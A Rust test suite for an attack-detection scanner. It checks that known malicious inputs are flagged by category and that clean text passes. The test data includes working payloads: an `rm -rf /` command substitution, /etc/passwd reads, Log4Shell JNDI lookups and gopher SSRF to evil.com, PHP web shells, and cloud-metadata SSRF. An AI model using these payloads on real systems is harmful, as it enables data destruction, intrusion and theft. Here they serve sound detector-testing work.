use attack_detection::{Scanner, Severity};

#[test]
fn test_xss_script_tag() {
    let scanner = Scanner::default();
    let results = scanner.scan("<script>alert(1)</script>");
    assert!(!results.is_empty());
    let r = &results[0];
    assert_eq!(r.attack_type, "xss");
    assert_eq!(r.severity, Severity::Critical);
}

#[test]
fn test_xss_event_handler() {
    let scanner = Scanner::default();
    let results = scanner.scan("<img onerror=alert(1)>");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "xss");
}

#[test]
fn test_sql_union_select() {
    let scanner = Scanner::default();
    let results = scanner.scan("1 UNION SELECT password FROM users");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "sql_injection");
}

#[test]
fn test_sql_sleep() {
    let scanner = Scanner::default();
    let results = scanner.scan("1; SELECT pg_sleep(5)");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "sql_injection");
}

#[test]
fn test_command_injection_backtick() {
    let scanner = Scanner::default();
    let results = scanner.scan("`cat /etc/passwd`");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "command_injection");
}

#[test]
fn test_command_injection_dollar_paren() {
    let scanner = Scanner::default();
    let results = scanner.scan("$(rm -rf /)");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "command_injection");
}

#[test]
fn test_nosql_injection_dollar_ne() {
    let scanner = Scanner::default();
    let results = scanner.scan(r#"{"username": {"$ne": ""}}"#);
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "nosql_injection");
}

#[test]
fn test_ldap_injection() {
    let scanner = Scanner::default();
    let results = scanner.scan("(&(uid=admin)(!(|(cn=*))))");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "ldap_injection");
}

#[test]
fn test_xpath_injection() {
    let scanner = Scanner::default();
    let results = scanner.scan("' or true() or '");
    assert!(!results.is_empty());
    let types: Vec<&str> = results.iter().map(|r| r.attack_type.as_str()).collect();
    assert!(types.contains(&"xpath_injection"), "Expected xpath_injection in {:?}", types);
}

#[test]
fn test_jndi_log4shell() {
    let scanner = Scanner::default();
    let results = scanner.scan("${jndi:ldap://evil.com/a}");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "jndi_injection");
}

#[test]
fn test_jndi_obfuscated() {
    let scanner = Scanner::default();
    let results = scanner.scan("${lower:j}ndi:ldap://evil.com/a}");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "jndi_injection");
}

#[test]
fn test_ssi_injection() {
    let scanner = Scanner::default();
    let results = scanner.scan("<!--#exec cmd=\"cat /etc/passwd\"-->");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "ssi_injection");
}

#[test]
fn test_graphql_introspection() {
    let scanner = Scanner::default();
    let results = scanner.scan("{ __schema { types { name } } }");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "graphql_injection");
}

#[test]
fn test_ssti_jinja2() {
    let scanner = Scanner::default();
    let results = scanner.scan("{{7*7}}");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "ssti");
}

#[test]
fn test_ssti_python_mro() {
    let scanner = Scanner::default();
    let results = scanner.scan("{{ ''.__class__.__mro__[1].__subclasses__() }}");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "ssti");
}

#[test]
fn test_ssrf_cloud_metadata() {
    let scanner = Scanner::default();
    let results = scanner.scan("http://169.254.169.254/latest/meta-data/");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "ssrf");
}

#[test]
fn test_ssrf_internal_ip() {
    let scanner = Scanner::default();
    let results = scanner.scan("http://10.0.0.1/admin");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "ssrf");
}

#[test]
fn test_ssrf_gopher() {
    let scanner = Scanner::default();
    let results = scanner.scan("gopher://evil.com/_GET / HTTP/1.1");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "ssrf");
}

#[test]
fn test_xxe_entity() {
    let scanner = Scanner::default();
    let results = scanner.scan("<!ENTITY xxe SYSTEM \"file:///etc/passwd\">");
    assert!(!results.is_empty());
    let types: Vec<&str> = results.iter().map(|r| r.attack_type.as_str()).collect();
    assert!(types.contains(&"xxe"), "Expected xxe in {:?}", types);
}

#[test]
fn test_header_crlf() {
    let scanner = Scanner::default();
    let results = scanner.scan("test%0d%0aSet-Cookie: evil=true");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "header_injection");
}

#[test]
fn test_host_header_attack() {
    let scanner = Scanner::default();
    let results = scanner.scan("Host: example.com\r\nX-Forwarded-Host: evil.com");
    assert!(!results.is_empty());
    let types: Vec<&str> = results.iter().map(|r| r.attack_type.as_str()).collect();
    assert!(types.contains(&"host_header"), "Expected host_header in {:?}", types);
}

#[test]
fn test_request_smuggling() {
    let scanner = Scanner::default();
    let results = scanner.scan("Transfer-Encoding: chunked\r\nTransfer-Encoding: identity");
    assert!(!results.is_empty());
    let types: Vec<&str> = results.iter().map(|r| r.attack_type.as_str()).collect();
    assert!(types.contains(&"request_smuggling"), "Expected request_smuggling in {:?}", types);
}

#[test]
fn test_open_redirect_double_slash() {
    let scanner = Scanner::default();
    let results = scanner.scan("//evil.com/phishing");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "open_redirect");
}

#[test]
fn test_open_redirect_javascript() {
    let scanner = Scanner::default();
    let results = scanner.scan("javascript:alert(document.cookie)");
    assert!(!results.is_empty());
}

#[test]
fn test_cors_null_origin() {
    let scanner = Scanner::default();
    let results = scanner.scan("Origin: null");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "cors");
}

#[test]
fn test_websocket_upgrade() {
    let scanner = Scanner::default();
    let results = scanner.scan("Upgrade: websocket");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "websocket");
}

#[test]
fn test_dns_rebinding() {
    let scanner = Scanner::default();
    let results = scanner.scan("Host: 127.0.0.1");
    assert!(!results.is_empty());
    let types: Vec<&str> = results.iter().map(|r| r.attack_type.as_str()).collect();
    assert!(types.contains(&"dns_rebinding"), "Expected dns_rebinding in {:?}", types);
}

#[test]
fn test_deserialization() {
    let scanner = Scanner::default();
    let results = scanner.scan("O:8:\"stdClass\":1:{s:4:\"test\";s:5:\"value\";}");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "deserialization");
}

#[test]
fn test_csv_injection() {
    let scanner = Scanner::default();
    let results = scanner.scan("=cmd|' /C calc'!A0");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "csv_injection");
}

#[test]
fn test_mail_header_injection() {
    let scanner = Scanner::default();
    let results = scanner.scan("Bcc: victim@evil.com");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "mail_header");
}

#[test]
fn test_jwt_none_algorithm() {
    let scanner = Scanner::default();
    let results = scanner.scan(r#"{"alg": "none", "typ": "JWT"}"#);
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "jwt_attack");
}

#[test]
fn test_prototype_pollution() {
    let scanner = Scanner::default();
    let results = scanner.scan(r#"{"__proto__": {"isAdmin": true}}"#);
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "prototype_pollution");
}

#[test]
fn test_path_traversal_dotdot() {
    let scanner = Scanner::default();
    let results = scanner.scan("../../../etc/passwd");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "path_traversal");
}

#[test]
fn test_path_traversal_php_filter() {
    let scanner = Scanner::default();
    let results = scanner.scan("php://filter/convert.base64-encode/resource=config.php");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "path_traversal");
}

#[test]
fn test_upload_php_tag() {
    let scanner = Scanner::default();
    let results = scanner.scan("<?php system($_GET['cmd']); ?>");
    assert!(!results.is_empty());
    let types: Vec<&str> = results.iter().map(|r| r.attack_type.as_str()).collect();
    assert!(types.contains(&"upload"), "Expected upload in {:?}", types);
}

#[test]
fn test_upload_short_tag() {
    let scanner = Scanner::default();
    let results = scanner.scan("<?= shell_exec($_POST['cmd']) ?>");
    assert!(!results.is_empty());
    let types: Vec<&str> = results.iter().map(|r| r.attack_type.as_str()).collect();
    assert!(types.contains(&"upload"), "Expected upload in {:?}", types);
}

#[test]
fn test_data_leak_aws_key() {
    let scanner = Scanner::default();
    let results = scanner.scan("AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "data_leak");
}

#[test]
fn test_data_leak_private_key() {
    let scanner = Scanner::default();
    let results = scanner.scan("-----BEGIN RSA PRIVATE KEY-----");
    assert!(!results.is_empty());
    let types: Vec<&str> = results.iter().map(|r| r.attack_type.as_str()).collect();
    assert!(types.contains(&"data_leak"), "Expected data_leak in {:?}", types);
}

#[test]
fn test_data_leak_openai_key() {
    let scanner = Scanner::default();
    let results = scanner.scan("sk-abcdefghijklmnopqrstuvwxyz123456");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "data_leak");
}

#[test]
fn test_data_leak_db_connection() {
    let scanner = Scanner::default();
    let results = scanner.scan("mongodb://admin:password@localhost:27017/db");
    assert!(!results.is_empty());
    assert_eq!(results[0].attack_type, "data_leak");
}

#[test]
fn test_clean_input_no_false_positive() {
    let scanner = Scanner::default();
    let results = scanner.scan("Hello, this is a normal text input. Nothing suspicious here.");
    assert!(results.is_empty());
}

#[test]
fn test_clean_json() {
    let scanner = Scanner::default();
    let results = scanner.scan(r#"{"name": "John", "age": 30, "city": "New York"}"#);
    assert!(results.is_empty());
}

#[test]
fn test_scan_with_specific_detectors() {
    let scanner = Scanner::default();
    let results = scanner.scan_with("<script>alert(1)</script>", &["xss"]);
    assert_eq!(results.len(), 1);
    assert_eq!(results[0].attack_type, "xss");

    let results = scanner.scan_with("<script>alert(1)</script>", &["sql_injection"]);
    assert!(results.is_empty());
}

#[test]
fn test_multiple_detections() {
    let scanner = Scanner::default();
    let input = r#"SELECT * FROM users; <script>alert(1)</script>"#;
    let results = scanner.scan(input);
    let types: Vec<&str> = results.iter().map(|r| r.attack_type.as_str()).collect();
    assert!(types.contains(&"sql_injection"));
    assert!(types.contains(&"xss"));
}

#[test]
fn test_builder_empty() {
    let scanner = Scanner::builder().build();
    let results = scanner.scan("<script>alert(1)</script>");
    assert!(results.is_empty());
}

#[test]
fn test_default_covers_all_categories() {
    let scanner = Scanner::default();
    let tests = vec![
        ("xss", "<script>alert(1)</script>"),
        ("sql_injection", "1 UNION SELECT password"),
        ("command_injection", "`cat /etc/passwd`"),
        ("nosql_injection", r#"{"$ne": ""}"#),
        ("ldap_injection", "(&(uid=*))"),
        ("xpath_injection", "' or true() or '"),
        ("jndi_injection", "${jndi:ldap://evil.com/a}"),
        ("ssi_injection", "<!--#exec cmd=\"ls\"-->"),
        ("graphql_injection", "{ __schema { types { name } } }"),
        ("ssti", "{{7*7}}"),
        ("ssrf", "http://169.254.169.254/"),
        ("xxe", "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"),
        ("header_injection", "test%0d%0aHeader: evil"),
        ("host_header", "Host: example.com\r\nX-Forwarded-Host: evil.com"),
        ("request_smuggling", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
        ("open_redirect", "//evil.com"),
        ("cors", "Origin: null"),
        ("websocket", "Upgrade: websocket"),
        ("dns_rebinding", "Host: 127.0.0.1"),
        ("deserialization", "O:8:\"stdClass\":0:{}"),
        ("csv_injection", "=cmd|' /C calc'!A0"),
        ("mail_header", "Bcc: spam@evil.com"),
        ("jwt_attack", r#"{"alg": "none"}"#),
        ("prototype_pollution", r#"{"__proto__": {}}"#),
        ("path_traversal", "../../../etc/passwd"),
        ("upload", "<?php system('id'); ?>"),
        ("data_leak", "AKIAIOSFODNN7EXAMPLE"),
    ];

    for (expected_type, input) in tests {
        let results = scanner.scan(input);
        assert!(
            !results.is_empty(),
            "No detection for {} with input: {}",
            expected_type,
            input
        );
        let types: Vec<&str> = results.iter().map(|r| r.attack_type.as_str()).collect();
        assert!(
            types.contains(&expected_type),
            "Expected {} not found in results {:?} for input: {}",
            expected_type,
            types,
            input
        );
    }
}
